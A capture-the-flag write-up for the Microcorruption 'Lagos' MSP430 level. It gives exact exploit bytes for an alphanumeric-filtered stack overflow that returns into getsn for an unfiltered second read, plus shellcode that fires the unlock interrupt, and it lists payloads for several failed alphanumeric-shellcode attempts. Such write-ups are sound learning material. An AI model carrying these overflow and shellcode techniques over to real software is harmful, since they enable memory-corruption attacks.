# Microcorruption — Lagos

This is the level where the login input is **restricted to alphanumeric
characters** (`0-9`, `A-Z`, `a-z`), and the door only opens on `INT 0x7F`. The
password path fires `INT 0x7E` (HSM-2), which needs a password I don't have.

The actual solution is two inputs and eight bytes of shellcode. It's almost
insultingly simple.

I did not find it for three days.

What I found instead was a rabbit hole so deep I built a *tool* to help me dig it,
and the tool worked so well at digging that it kept me in the hole. This writeup is
the honest version: the clean solve is at the top, and the entire graveyard of
harder-than-necessary ideas is at the bottom, because on this level the dead ends
genuinely are the story.

---

## The target

`login` (`0x455e`) does roughly this:

1. `getsn(0x2400, 0x200)` — read up to 512 raw bytes into the global buffer at
   `0x2400`.
2. A filter loop (`0x45a0–0x45c6`) copies bytes from `0x2400` onto a **16-byte
   stack buffer**, one at a time, and **stops at the first non-alphanumeric byte**.
   There's no length check on the copy, so it's a clean stack overflow — but every
   byte that lands has to be alphanumeric.
3. `memset(0x2400, 0, 0x200)` — wipes the raw input buffer. (Remember this one. It
   killed an entire idea.)
4. `conditional_unlock_door` → `INT 0x7E` (HSM-2). Unlocks only for the correct
   password, which I don't have, and there's no verdict flag sitting in memory to
   corrupt (that was HSM-1's thing).
5. `ret`.

The door opens on `INT 0x7F`, delivered by the little trampoline at `0x45fc`. It
takes a number, folds it into the status register, and pokes the gate:

```
45fc: mov 0x2(sp), r14      ; N = number from the stack
4602: mov r14, r15
4604: swpb r15              ; N -> high byte
4606: mov r15, sr           ; sr = N << 8
4608: bis #0x8000, sr       ; sr = 0x8000 | (N << 8)
460c: call #0x10            ; PC = 0x10 with sr set -> emulator fires the interrupt
```

The interrupt number is `(sr >> 8) & 0x7f`, and bit 15 is the "please actually do
it" request flag. So `INT 0x7F` means **`sr = 0xff00`**. That's the whole target:
get `sr = 0xff00`, then hit the gate.

---

## The bug that actually matters

The overflow lets me overwrite `login`'s saved return address — but only with
**alphanumeric** bytes. And the instructions that unlock (`swpb`, `bis`, `call`,
anything with `0x7f`/`0xff`/`0x00` in it) are not alphanumeric-encodable. That
single fact is what ate three days.

The real weakness is dumber than any of that: **the filter only guards the copy to
the stack. `getsn` itself does not filter anything.** So if I can make the program
call `getsn` a *second* time, that read takes **arbitrary bytes** — including a
perfectly clean `mov #0xff00, sr ; call #0x10`.

`getsn` (`0x4650`) sets up its own arguments and fires:

```
4650: push r14        ; length
4652: push r15        ; buffer
4654: push #0x2       ; INT number 2 = read input
4656: call #0x45fc    ; go
465a: add #0x6, sp
465e: ret
```

If I return to **`0x4654`** instead of `0x4650`, I skip the two `push`es. That means
the buffer address and length the interrupt reads come from **my overflowed stack**,
which I control. I pick where the unfiltered second input lands, and I pick where
`getsn`'s trailing `ret` sends control afterward.

That's the entire level. The alphanumeric constraint was never a property of the
program — just of one code path.

---

## The exploit

### First input (all alphanumeric)

```
61  6161 6161 6161 6161 6161 6161 6161 6161  5446  3044 3044 3044 3044 3044
```

| bytes             | value    | role |
|-------------------|----------|------|
| `61` × 17 (`a`)   | padding  | fills the buffer up to the saved return address (the lone leading `61` is there to eat the filter's duplicate-first-byte quirk) |
| `54 46`           | `0x4654` | new return address → re-enter `getsn` past its pushes = the unfiltered second read |
| `30 44` × 5       | `0x4430` | doubles as `getsn`'s **buffer** argument (second input lands at `0x4430`) **and** the address its `ret` pops → `PC = 0x4430` |

Flow: `login` returns to `0x4654` → `getsn` reads a second input straight to
`0x4430` → its tail `add #0x6, sp ; ret` pops `0x4430` → we jump into the bytes we
just wrote.

`0x4430` is just a spot in code I can name with alphanumeric bytes and that's safe
to clobber. Honestly I didn't even compute where it'd land in the clever way the
other writeups do — I just ran it, watched in the debugger where the second input
got written, and pointed the return there. Observation beats prediction when you
have a single-stepper.

### Second input (unfiltered — anything goes)

```
32 40 00 ff   b0 12 10 00
```

| bytes         | instruction        | effect |
|---------------|--------------------|--------|
| `32 40 00 ff` | `mov #0xff00, sr`  | `sr = 0xff00`: bit 15 = request, bits 8–14 = `0x7f` |
| `b0 12 10 00` | `call #0x10`       | hit the gate with `sr` already set → **INT 0x7F → unlock** |

The thing that took me embarrassingly long to internalize: **`mov #0xff00, sr ;
call #0x10` is the entire interrupt, self-contained.** No `push`, no `swpb`, no
reading `2(sp)`, no trampoline. The whole `push #0x7e ; call #0x45fc` dance in the
real code exists to pass an *arbitrary* interrupt number as an argument. When you
already know the number at write-time, you skip all of it and bake `0xff00` right
into the `mov`. `mov` also touches no flags, so the value survives clean into the
`call`.

Every wall I spent three days hitting was a wall around *reusing the trampoline*.
The moment I could write raw bytes, I didn't need the trampoline at all.

---

## The three days I'm not proud of

Before the second-`getsn` idea, I was completely locked onto solving it with
**alphanumeric shellcode only** — never getting an unfiltered write, just building
the unlock out of typeable bytes in a single input. Every one of these was a real,
plausible-looking path. Every one hit a wall the reasoning could've predicted if
I'd stepped back.

**And here's the trap:** early on I realized alphanumeric shellcode is brutal to
hand-write, so I built a tool to enumerate which MSP430 instructions and immediates
are even encodable under an alphanumeric byte set, plus a searcher that finds
`add`-chains to construct target values (`0x7f`, `0xff00`, `0x10`) in a register
from legal constants.

The tool was great. That was the problem. It made the hard path *feel* tractable —
every day it'd hand me a fresh set of legal gadgets and I'd think "okay *this*
combination will do it," and I'd grind another attempt instead of questioning
whether the whole approach was necessary. A worse tool would've made me give up on
alphanumeric-only sooner and go looking for the easy door. Instead I had a
beautifully engineered shovel and used it to dig for three days.

> The tool (separate repo, appropriately named): **AGI** — it filters MSP430
> opcodes. [link](https://github.com/sharryy/agi)

Here's the graveyard, each attempt tied to the wall it hit.

### Attempt A — load SR directly from an existing `0xffXX` word in memory

Idea: skip `swpb` entirely by finding a word already equal to `0xff00`-ish in the
image and loading it straight into `sr`.

```
61 6161 6161 6161 6161 6161 6161 6161 6161 4644 6162 6666 ... 6666 3450 3646 6666 ... 3244
```

- `add #0x4636, r4` → `r4 = 0x4636`
- `mov @r4+, sr` → `sr = word@0x4636 = 0xfffc` (the immediate from `mov #0xfffc,
  r15` in `getchar`); high byte `0xff` = int `0x7f` + request bit

**Wall:** the snippet ends *at* the `mov`. There's no `call #0x10` or jump to the
gate after it, so it loads `sr` correctly and then just... stops. And I couldn't
cleanly reach the gate afterward without hitting an illegal address.

### Attempt B — build the number in a register, then pivot SP toward `0x2400`

Idea: build `0x7f` in a register, move the stack pointer down to the raw input
buffer at `0x2400`, and run unrestricted shellcode I'd parked there.

```
61 6161 ... 4644 6162 6666 ... 3450 3130 3450 5a50 3450 7a4f 3450 7a30 6666 ... 3150 304a 3150 564a 3150 7a4b
```

- `add #0x3031,r4; add #0x505a,r4; add #0x4f7a,r4; add #0x307a,r4` → `r4 = 0x7f`
- `mov.b r4, r14` / `mov.b r4, r11` → number in a register
- `add #0x4a30,sp; add #0x4a56,sp; add #0x4b7a,sp` → `sp -= 0x2000` (`0x4400 → 0x2400`)

**Wall:** `0x2400` is exactly the buffer `memset` zeroes at step 3, before I ever
get control. My parked shellcode was gone before execution reached it. (This is the
"remember this one" from way up top.)

### Attempt C — build SR with add-chains, jump through a *found* trampoline pointer

Idea: build `0xff00` in `sr` by hand with three `add`s, then transfer control to
the trampoline.

The interesting sub-problem here is the control transfer. I can't `mov #0x45fc, pc`
— `mov`-into-`pc` (dst = r0) in register mode forces the low byte to `0x00`, illegal,
and `mov #imm, pc` embeds the address `0x45fc` whose byte `0xfc` is illegal too. So
I can't *name* the address I want to jump to at all.

The way around it: **I don't type the address, I point at a copy of it that already
exists in memory.** This is where the tool actually earned its keep — I had it
enumerate legal instructions and it surfaced that `mov @r5+, pc` (indirect jump
through a register) *is* alphanumeric-encodable. So the plan became: find some word
in the image that already equals the address I want, get *that word's address* into
a register (legal, because I picked a pointer whose address is typeable), and jump
through it with `mov @rX+, pc`. The illegal target address never appears in my
input — it's read out of memory at runtime.

I scanned memory, found a word holding `0x45fc` at an alphanumeric-addressable
location, and:

```
61 6161 ... 4644 6162 6666 ... 3750 5846 3250 4155 3250 4155 3250 4155 3047 3041
```

- `add #0x4658, r7` → `r7` = address of a word that contains `0x45fc`
- `add #0x5541, sr` × 3 → `sr` high byte climbs `0x55 → 0xaa → 0xff`
- `mov @r7+, pc` → reads `0x45fc` out of memory and jumps there — no illegal byte
  ever typed

(Caveat I learned the hard way: this only works because a word holding `0x45fc`
*happened* to sit at a typeable address. I got lucky. You can't manufacture such a
pointer — you're at the mercy of what's already in the image, so this is a scan,
not a construction.)

**Wall:** entering the trampoline at `0x45fc` re-runs `mov 0x2(sp), r14 ; ... ; mov
r15, sr` — which **overwrites the `sr` I just carefully built** with whatever
`2(sp)` swpb's to. I built the answer and then the trampoline erased it on the way
in. To skip the overwrite I'd need to enter at `0x4608`/`0x460c` (past the `mov
r15, sr`), and those addresses have illegal bytes (`0x08`, `0x0c`) — and unlike
`0x45fc`, no word in memory happened to hold *those* values at a typeable address,
so the found-pointer trick couldn't rescue it either.

### Attempt D — flip the pushed `0x7e` to `0x7f` in place

Idea: I'm overwriting code anyway, so overwrite `conditional_unlock_door`'s `push
#0x7e` (`0x445c`) so it pushes `0x7f` instead, then let the existing trampoline
fire it.

**Wall:** `0x7f` is not an alphanumeric byte, so I can't type it into the operand.
And the operand isn't reachable by arithmetic-at-runtime either without a
memory-write instruction — which brings us to:

### Attempt E — just write `0x7f` to the stack slot the trampoline reads

Idea: forget building `sr`; the trampoline reads `2(sp)`, so put `0x007f` there.

**Wall:** there is **no legal way to write memory at all.** `push` is Format II →
opcode byte `0x12` → illegal. A two-operand `mov`/`add`/`xor` with an *indexed
destination* sets the Ad bit (bit 7 of the low byte) → pushes the byte to `0x80`+
→ illegal, for *every* opcode. So no store, no push, nothing puts a computed value
into memory. `0x7f` can be built in a register and can never leave it.

This one is the cleanest proof of why the whole single-input approach is doomed:
the number has to reach either the stack (can't write memory) or `sr` via the
trampoline (which overwrites it) or `sr` directly (can't jump to the gate). Every
road out is blocked. The constraint isn't "hard," it's closed.

### Attempt F — point `2(sp)` at an existing `0x7f`/`0xff` byte

Idea: if I can't *write* `0x7f`, maybe one already exists in the image and I can
slide `sp` so `2(sp)` lands on it.

**Wall:** the emulator enforces word-aligned reads, and every `0xff` in the binary
is the high byte of some `0xffXX` immediate → it sits at an **odd** address. There
is no even-aligned `0x7f` or `0xff` byte to point at. Also I couldn't move `sp` to
an arbitrary spot precisely anyway (the `add`-to-`sp` gadgets are coarse).

---

## What actually unstuck it

All six of those die for the same underlying reason: I was trying to **defeat the
alphanumeric filter** — smuggle an illegal value past it, or reconstruct the unlock
out of legal pieces. And the filter is genuinely, provably airtight against that on
a single input.

The fix wasn't to beat the filter. It was to notice the filter only runs **once**,
on the first read, and then go get a **second** read through a path (`getsn`) that
never filtered anything. Write real shellcode into the second input, let an
existing `ret` deliver control to it, done.

The tool would never have found that, because the tool was built to answer "what
can I do within the constraint" — and the answer was "stop being inside the
constraint."

---

## Lessons (the transferable bits)

- **A filter is a property of one code path, not of the program.** Before you try
  to defeat a constraint on your input, look for a second input through a path that
  doesn't have the constraint. It almost always exists, and it's almost always
  easier than beating the filter head-on.
- **`mov #0xff00, sr ; call #0x10` is the whole interrupt, stack-free.** When you
  know the number at write-time you never need the trampoline, the `swpb`, or the
  stack read. Bake it into the `mov`.
- **Observe, don't predict.** I could've hand-computed where the second input
  lands and set up `getsn`'s r14/r15 like the other writeups do. I just ran it and
  watched the debugger. With a single-stepper in hand, looking is cheaper than
  reasoning.
- **A good tool can keep you in a bad approach.** The alphanumeric-shellcode tool
  made the hard path feel viable day after day, so I never stepped back to ask if
  the path was necessary. Sometimes the fix isn't a better tool — it's dropping the
  frame the tool was built for.